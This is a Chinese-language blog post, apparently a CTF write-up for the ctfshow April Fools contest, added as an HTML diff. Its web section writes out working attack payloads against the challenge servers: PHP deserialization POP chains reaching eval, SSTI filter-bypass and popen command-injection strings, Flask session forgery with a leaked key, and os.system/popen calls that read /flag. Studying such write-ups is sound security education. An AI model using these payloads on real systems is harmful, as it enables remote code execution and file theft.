@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ctfshow愚人杯 |  b1xcy&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-2023ctfshow愚人杯"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ctfshow愚人杯
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/01/07/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/" class="article-date">
+  <time datetime="2024-01-07T12:45:56.012Z" itemprop="datePublished">2024-01-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">7 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>hint如下:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042119063.png" alt="image-20230404211906983"></p>
+<p>没想到他flag直接就是中文”一个不能说的秘密”，涨见识了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;一个不能说的秘密&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>下载下来是一个加密的压缩包，按照惯例先试试是不是伪加密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042122149.png" alt="image-20230404212240131"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042123133.png" alt="image-20230404212308114"></p>
+<p>这两个位置都换成00 00，保存打开得到black.png</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042124771.png" alt="image-20230404212400755"></p>
+<p>显示了半截，先猜测高度隐写</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042126761.png" alt="image-20230404212648742"></p>
+<p>把第二段的96改成等高度384试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042127702.png" alt="image-20230404212730674"></p>
+<p>得到全文，但是还是得binwalk看一下有没有藏比</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354105.png" alt="image-20230404235003535"></p>
+<p>有藏比，用foremost分离一下得到一个png和zip文件</p>
+<p>其实在black.png最后边有提示key，base64之后就是“yurenjie”，这是压缩密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354312.png" alt="image-20230404235153184"></p>
+<p>得到flag.png，还是高度隐写，修改之后就能得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354502.png" alt="image-20230404235248682"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;Th1s_i5_f1ag&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>是个base64编码之后传值到img显示图片</p>
+<p>把index.php base64后传进去得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042357547.png" alt="image-20230404235735530"></p>
+<p>解码得到内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042358391.png" alt="image-20230404235801368"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;eff420e3-947e-4c4b-816a-ed8810990daf&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h3><p>这题解法太多了，能用php原生类做，学长两步就直接做出来了，根本没用到加密函数</p>
+<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>我的步骤还是有点繁琐</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># 当前目录中有一个txt文件哦</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;check.php&quot;);</span><br><span class="line"></span><br><span class="line">class EeE&#123;</span><br><span class="line">    public $text;</span><br><span class="line">    public $eeee;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if ($this-&gt;text == &quot;aaaa&quot;)&#123;</span><br><span class="line">            echo lcfirst($this-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($kk)&#123;</span><br><span class="line">        echo &quot;$kk,eeeeeeeeeeeee&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cycycycy&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    private $b;</span><br><span class="line"></span><br><span class="line">    public function aaa()&#123;</span><br><span class="line">        $get = $_GET[&#x27;get&#x27;];</span><br><span class="line">        $get = cipher($get);</span><br><span class="line">        if($get === &quot;p8vfuv8g8v8py&quot;)&#123;</span><br><span class="line">            eval($_POST[&quot;eval&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $a_a = $this -&gt; a;</span><br><span class="line">        echo &quot;\$a_a\$&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class gBoBg&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $file;</span><br><span class="line">    public $coos;</span><br><span class="line">    private $eeee=&quot;-_-&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;name))&#123;</span><br><span class="line">            $a = new $this-&gt;coos($this-&gt;file);</span><br><span class="line">            echo $a;</span><br><span class="line">        &#125;else if(!isset($this -&gt; file))&#123;</span><br><span class="line">            return $this-&gt;coos-&gt;name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $aa = $this-&gt;coos;</span><br><span class="line">            $bb = $this-&gt;file;</span><br><span class="line">            return $aa();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">class w_wuw_w&#123;</span><br><span class="line">    public $aaa;</span><br><span class="line">    public $key;</span><br><span class="line">    public $file;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$this -&gt; key))&#123;</span><br><span class="line">            $this-&gt;key = file_get_contents($this -&gt; file);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;不行哦&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</span><br><span class="line">unserialize($_ip);</span><br></pre></td></tr></table></figure>
+
+<p>就四个类，还是很好做的</p>
+<p>由于不知道其中cipher()函数的加密方式，所以得先看看包含的check.php内容是什么（byd他说的那个txt根本扫不出来，还是我最后做完才翻的目录是h1nt.txt💧）</p>
+<p>在w_wuw_w类中有file_get_contents()函数可以方便的把$file外带出来，但是他只在destruct的时候echo出$aaa，所以就要用到之前狗学长说过的引用&amp;赋值</p>
+<p>让$aaa &#x3D; &amp;$file，使得这两个变量指向相同地址，这样两个变量的内容就会同时改变</p>
+<p>构造出payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$w_wuw_w = new w_wuw_w();</span><br><span class="line">$w_wuw_w -&gt; key = &#x27;test&#x27;;</span><br><span class="line">$w_wuw_w -&gt; file = &#x27;check.php&#x27;;</span><br><span class="line">$w_wuw_w -&gt; aaa = &amp;$w_wuw_w -&gt; key;</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:4:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:4:&quot;test&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;s:0:&quot;&quot;;R:3;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>外带出check.php的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050012246.png" alt="image-20230405001238222"></p>
+<p>略加修改一下就得到了具体的内容，分析一下能写出解密脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_string(input_string):</span><br><span class="line">    charset = &quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span><br><span class="line">    shift = 4</span><br><span class="line">    shifted = &quot;&quot;</span><br><span class="line">    for char in input_string:</span><br><span class="line">        pos = charset.find(char)</span><br><span class="line">        if pos != -1:</span><br><span class="line">            new_pos = (pos + shift + len(charset)) % len(charset)</span><br><span class="line">            shifted += charset[new_pos]</span><br><span class="line">        else:</span><br><span class="line">            shifted += char</span><br><span class="line">    return shifted</span><br><span class="line">print(decrypt_string(&#x27;p8vfuv8g8v8py&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>得到原本get该传入的值：fe1ka1ele1efp</p>
+<p>由w_wuw_w的echo函数又可以调用__toString，总结一下得到pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w_wuw_w::__destruct() -&gt; gBoBg::__toString() -&gt; w_wuw_w::__invoke() -&gt; EeE::__clone() -&gt; cycycycy::aaa()</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:4:&quot;test&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;N;&#125;&#125;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时传入?get&#x3D;fe1ka1ele1efp;eval&#x3D;system(‘ls &#x2F;‘);</p>
+<p>就可得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016174.png" alt="image-20230405001615152"></p>
+<p>cat一下就行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016060.png" alt="image-20230405001637044"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;be571200-b78b-4bfe-ba08-71787e58acb6&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=new w_wuw_w();</span><br><span class="line">$b=new gBoBg();</span><br><span class="line">$a-&gt;aaa=$b;</span><br><span class="line">$b-&gt;name=123;</span><br><span class="line">$b-&gt;coos=&quot;SplFileObject&quot;;</span><br><span class="line">$b-&gt;file=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>加请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:11:&quot;glob:///*f*&quot;;s:4:&quot;coos&quot;;s:17:&quot;DirectoryIterator&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br><span class="line">#得到文件名：f1agaaa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=/f1agaaa&quot;;s:4:&quot;coos&quot;;s:13:&quot;SplFileObject&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用的是php原生类，glob直接查flag，SplFileObject查flag，太快了</p>
+<h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p>提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025322.png" alt="image-20230405002511299"></p>
+<p>打开看到是常见的ssti</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025174.png" alt="image-20230405002546148"></p>
+<p>用hackbar的ssti换几个试试，找到app.py的源码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050028102.png" alt="image-20230405002846077"></p>
+<p>很明显，要求过滤了f和&#x2F;，但是如果里边有ge就可以正常解析</p>
+<p>由于要先出现ge，那就构造shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ge=&quot;test&quot;;cd ..;cat flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050036618.png" alt="image-20230405003607596"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;1fe332f3-a27d-44f2-b864-2416b80c021e&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实扫网的时候有console目录，也可以通过ssti得到机器信息算出pin码直接执行python命令，不过更复杂了</p>
+<h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>相似，只不过狗学长用的cat命令更巧妙，没有构造ge</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat $&#123;PATH:0:1&#125;[9-q][9-q][9-q][9-q]</span><br></pre></td></tr></table></figure>
+
+<p>用${PATH:0:1}代替&#x2F;，正则[9-q]匹配flag四个字母</p>
+<h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>官方给的题解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hello/&#123;&#123; &quot;&quot;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](request.args.get(&quot;ctfshow&quot;)).read()&#125;&#125;ge?ctfshow=cat /flag </span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>打开是个登陆页面，用sqlmap也爆不出来，就尝试直接注册登陆看看内容</p>
+<p>登陆进去提示我的角色是user，当角色是admin的时候会给出东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051204342.png" alt="image-20230405120423293"></p>
+<p>再看看learn的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206785.png" alt="image-20230405120609765"></p>
+<p>给出了app.secret_key &#x3D; ‘S3cr3tK3y’，在burp里又能看到cookie内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206709.png" alt="image-20230405120639690"></p>
+<p>base64解码出来就能看到信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051207045.png" alt="image-20230405120713026"></p>
+<p>所以就用工具伪造一下session</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051210297.png" alt="image-20230405121020273"></p>
+<p>加密后用burp传进去就有任意文件下载的功能</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051211084.png" alt="image-20230405121111065"></p>
+<p>看一下app.py是怎么写的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216349.png" alt="image-20230405121604328"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216781.png" alt="image-20230405121621759"></p>
+<p>分别给出了admin的密码和一个hello路径，有eval利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;ls / &gt; test&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>然后任意文件读取test</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051225286.png" alt="image-20230405122559265"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;cat /flag_is_h3re &gt; test&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>或者更直接一点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).popen(&#x27;cat /*f*&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;d7cbfb77-b2fb-47ee-ade9-e78bd40c9871&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h3><p>一把梭脚本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051240312.png" alt="image-20230405124031283"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/01/07/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A2%98%E8%A7%A3/" rel="tag">题解</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/01/07/ctfshow_%E8%90%8C%E6%96%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            ctfshow_萌新
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/01/07/2022%E7%BA%A2%E5%B2%A9%E6%96%B0%E7%94%9F%E6%9D%AF/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">2022红岩新生杯</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> b1xcy
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/side.svg" alt="b1xcy&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
